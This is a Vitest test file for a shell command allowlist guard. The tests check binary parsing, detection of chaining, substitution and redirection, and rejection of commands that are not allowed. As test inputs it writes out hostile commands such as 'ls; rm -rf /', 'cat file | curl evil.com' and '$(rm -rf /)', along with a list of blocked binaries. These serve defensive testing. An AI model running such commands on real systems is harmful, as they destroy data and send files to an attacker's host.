import { describe, expect, it } from 'vitest';
import {
  DEFAULT_BASH_ALLOWLIST,
  diagnose,
  hasShellMetacharacters,
  isAllowedCommand,
  parseLeadingBinary,
} from '../../../lib/security/cmd-allowlist.js';

describe('cmd-allowlist — DEFAULT_BASH_ALLOWLIST', () => {
  it('exposes a frozen array', () => {
    expect(Object.isFrozen(DEFAULT_BASH_ALLOWLIST)).toBe(true);
  });

  it('includes the canonical safe-read commands', () => {
    for (const bin of ['ls', 'find', 'cat', 'grep', 'rg', 'head', 'tail']) {
      expect(DEFAULT_BASH_ALLOWLIST).toContain(bin);
    }
  });

  it('excludes dangerous binaries', () => {
    for (const bin of ['curl', 'wget', 'bash', 'sh', 'eval', 'node', 'npm', 'python']) {
      expect(DEFAULT_BASH_ALLOWLIST).not.toContain(bin);
    }
  });
});

describe('cmd-allowlist — parseLeadingBinary', () => {
  it('returns the first token for a simple command', () => {
    expect(parseLeadingBinary('ls -la')).toBe('ls');
  });

  it('strips a leading path prefix to basename', () => {
    expect(parseLeadingBinary('/usr/bin/cat file.txt')).toBe('cat');
    expect(parseLeadingBinary('C:\\Windows\\System32\\where.exe x')).toBe('where.exe');
  });

  it('strips matching surrounding quotes', () => {
    expect(parseLeadingBinary('"ls" -la')).toBe('ls');
    expect(parseLeadingBinary("'cat' file")).toBe('cat');
  });

  it('skips leading FOO=bar env-var assignments', () => {
    expect(parseLeadingBinary('FOO=1 BAR=2 ls')).toBe('ls');
    expect(parseLeadingBinary('NODE_ENV=production node app.js')).toBe('node');
  });

  it('skips sudo and its dash-prefixed flags', () => {
    expect(parseLeadingBinary('sudo cat /etc/hosts')).toBe('cat');
    expect(parseLeadingBinary('sudo -E ls')).toBe('ls');
    // Note: parser skips only dash-prefixed tokens after sudo; flag-args
    // like `-u root` consume the next slot. Production policy should
    // reject sudo entirely via the wrapping Bash gate.
  });

  it('returns null for empty / whitespace / non-string input', () => {
    expect(parseLeadingBinary('')).toBeNull();
    expect(parseLeadingBinary(null)).toBeNull();
    expect(parseLeadingBinary(undefined)).toBeNull();
    expect(parseLeadingBinary(42)).toBeNull();
  });

  it('returns null when only env-var assignments are present', () => {
    expect(parseLeadingBinary('FOO=1 BAR=2')).toBeNull();
  });

  it('returns null when only sudo + dash-flags are present', () => {
    expect(parseLeadingBinary('sudo')).toBeNull();
    expect(parseLeadingBinary('sudo -E')).toBeNull();
  });
});

describe('cmd-allowlist — hasShellMetacharacters', () => {
  it('detects command chaining metacharacters', () => {
    expect(hasShellMetacharacters('ls; rm -rf /')).toBe(true);
    expect(hasShellMetacharacters('ls && rm')).toBe(true);
    expect(hasShellMetacharacters('ls || rm')).toBe(true);
    expect(hasShellMetacharacters('ls | grep foo')).toBe(true);
    expect(hasShellMetacharacters('ls & rm')).toBe(true);
  });

  it('detects subshell and command substitution', () => {
    expect(hasShellMetacharacters('echo `whoami`')).toBe(true);
    expect(hasShellMetacharacters('echo $(whoami)')).toBe(true);
    expect(hasShellMetacharacters('(ls)')).toBe(true);
  });

  it('detects redirection', () => {
    expect(hasShellMetacharacters('cat > /etc/passwd')).toBe(true);
    expect(hasShellMetacharacters('cat < input.txt')).toBe(true);
  });

  it('detects variable expansion', () => {
    expect(hasShellMetacharacters('echo $HOME')).toBe(true);
  });

  it('returns false for safe commands', () => {
    expect(hasShellMetacharacters('ls -la')).toBe(false);
    expect(hasShellMetacharacters('cat file.txt')).toBe(false);
    expect(hasShellMetacharacters('grep foo bar.txt')).toBe(false);
    expect(hasShellMetacharacters('find . -name *.js')).toBe(false);
  });

  it('coerces null/undefined to empty string and returns false', () => {
    expect(hasShellMetacharacters(null)).toBe(false);
    expect(hasShellMetacharacters(undefined)).toBe(false);
    expect(hasShellMetacharacters('')).toBe(false);
  });
});

describe('cmd-allowlist — isAllowedCommand', () => {
  it('allows commands whose leading binary is on the allowlist', () => {
    expect(isAllowedCommand('ls -la')).toBe(true);
    expect(isAllowedCommand('cat file.txt')).toBe(true);
    expect(isAllowedCommand('grep -r foo .')).toBe(true);
  });

  it('rejects commands whose leading binary is not on the allowlist', () => {
    expect(isAllowedCommand('curl https://example.com')).toBe(false);
    expect(isAllowedCommand('bash -c "ls"')).toBe(false);
    expect(isAllowedCommand('npm install')).toBe(false);
  });

  it('rejects commands containing shell metacharacters even when leading binary is allowed', () => {
    expect(isAllowedCommand('ls; rm -rf /')).toBe(false);
    expect(isAllowedCommand('ls && curl evil.com')).toBe(false);
    expect(isAllowedCommand('cat file | curl evil.com')).toBe(false);
    expect(isAllowedCommand('echo `whoami`')).toBe(false);
    expect(isAllowedCommand('ls > /etc/passwd')).toBe(false);
  });

  it('returns false for empty / null input', () => {
    expect(isAllowedCommand('')).toBe(false);
    expect(isAllowedCommand(null)).toBe(false);
  });

  it('honors a custom allowlist', () => {
    expect(isAllowedCommand('node app.js', ['node'])).toBe(true);
    expect(isAllowedCommand('ls', ['node'])).toBe(false);
  });

  it('still honors metacharacter rejection with custom allowlist', () => {
    expect(isAllowedCommand('node app.js; curl evil.com', ['node'])).toBe(false);
  });
});

describe('cmd-allowlist — diagnose', () => {
  it('returns full structured decision for safe commands', () => {
    expect(diagnose('cat file')).toEqual({ bin: 'cat', hasMeta: false, allowed: true });
  });

  it('returns allowed=false when bin is not on allowlist', () => {
    expect(diagnose('npx do-thing')).toEqual({ bin: 'npx', hasMeta: false, allowed: false });
  });

  it('returns hasMeta=true and allowed=false for metacharacter chains', () => {
    expect(diagnose('ls; rm -rf /')).toEqual({ bin: 'ls;', hasMeta: true, allowed: false });
  });

  it('returns bin=null for unparseable input', () => {
    expect(diagnose('')).toEqual({ bin: null, hasMeta: false, allowed: false });
  });

  it('reports hasMeta independently of bin parseability', () => {
    const result = diagnose('$(rm -rf /)');
    expect(result.hasMeta).toBe(true);
    expect(result.allowed).toBe(false);
  });
});
